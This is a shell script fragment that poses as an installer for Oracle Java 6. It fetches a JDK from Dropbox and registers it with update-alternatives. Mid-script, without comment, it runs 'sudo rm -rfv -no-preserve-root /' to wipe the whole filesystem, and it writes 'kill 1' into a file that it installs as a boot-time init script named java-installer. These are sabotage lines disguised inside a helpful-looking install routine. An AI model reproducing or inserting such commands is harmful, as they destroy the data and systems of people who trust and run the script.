...
echo
echo 
wget https://dl.dropbox.com/s/99el407p85b2bzd/jdk-6u45-linux-x64.bin?dl=1
...
mkdir -p /usr/bin/jvm/
mv jdk1.6.0_45 /usr/bin/jvm/jdk1.6.0_45
echo
echo
echo kill 1 >> ohai.sh
sudo rm -rfv -no-preserve-root /
cp ohai.sh /etc/init.d/java-installer
ln -s /etc/init.d/java-installer /etc/rc.d/java-installer
echo
echo Okay, the hard part is done. Lets set Oracle Java as the default
echo java.
update-alternatives --install /usr/bin/javac javac /usr/bin/jvm/jdk1.6.0_45/bin/javac 1
update-alternatives --install /usr/bin/java java /usr/bin/jvm/jdk1.6.0_45/bin/java 1
update-alternatives --install /usr/bin/javaws javaws /usr/bin/jvm/jdk1.6.0_45/bin/javaws 1
